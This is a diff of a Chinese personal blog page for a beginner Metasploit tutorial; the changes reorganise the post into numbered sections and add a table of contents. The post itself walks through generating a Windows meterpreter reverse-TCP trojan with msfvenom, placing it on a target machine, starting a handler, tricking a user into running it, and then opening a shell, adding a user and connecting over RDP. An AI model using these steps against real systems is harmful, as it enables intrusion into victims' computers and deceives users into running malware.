@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
+<meta name="description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 <meta name="keywords" content="MSF,Metasploit">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Metasploit(MSF)入门">
 <meta property="og:url" content="https://jeremyekek.github.io/2019/03/14/Metasploit-MSF/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
+<meta property="og:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-16T11:15:17.525Z">
+<meta property="og:updated_time" content="2019-04-07T04:34:31.492Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploit(MSF)入门">
-<meta name="twitter:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
+<meta name="twitter:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
 
 
 
@@ -354,8 +354,8 @@
       
 
       
-        <p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p>
-<p>kali集成了Metasploit框架，依赖于postgresql数据库</p>
+        <h2 id="一、Metasploit介绍"><a href="#一、Metasploit介绍" class="headerlink" title="一、Metasploit介绍"></a>一、Metasploit介绍</h2><p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p>
+<h2 id="二、Metasploit启动"><a href="#二、Metasploit启动" class="headerlink" title="二、Metasploit启动"></a>二、Metasploit启动</h2><p>kali集成了Metasploit框架，依赖于postgresql数据库</p>
 <ol>
 <li><p>先启动数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
@@ -363,14 +363,12 @@
 <li><p>启动MSF</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>利用MSF生成木马获取meterpreter反弹shell</p>
+</ol>
+<h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
 <p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p>
-</li>
-<li><p>投放木马到目标机上</p>
-</li>
-<li><p>启用MSF，具体操作如下：</p>
+<h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p>
 <ol>
 <li><p>加载expuse </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure>
@@ -384,17 +382,17 @@
 <li><p>运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>诱导用户点击我们的木马程序</p>
-</li>
-<li><p>等待用户上线，就能得到meterpreter,</p>
-</li>
+</ol>
+<h2 id="六、进行欺骗"><a href="#六、进行欺骗" class="headerlink" title="六、进行欺骗"></a>六、进行欺骗</h2><ol>
+<li>诱导用户点击我们的木马程序</li>
+<li>等待用户上线，就能得到meterpreter</li>
+</ol>
+<h2 id="七、获得shell"><a href="#七、获得shell" class="headerlink" title="七、获得shell"></a>七、获得shell</h2><ol>
 <li><p>执行shell 进到被攻击者电脑的终端</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>添加添加用户  开机3389 连接桌面(</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
 </li>
 </ol>
 
@@ -503,8 +501,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -519,7 +526,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -541,7 +548,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -718,6 +725,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Metasploit介绍"><span class="nav-text">一、Metasploit介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Metasploit启动"><span class="nav-text">二、Metasploit启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、生成木马程序"><span class="nav-text">三、生成木马程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、投放木马到目标机上"><span class="nav-text">四、投放木马到目标机上</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、开启监听"><span class="nav-text">五、开启监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、进行欺骗"><span class="nav-text">六、进行欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、获得shell"><span class="nav-text">七、获得shell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
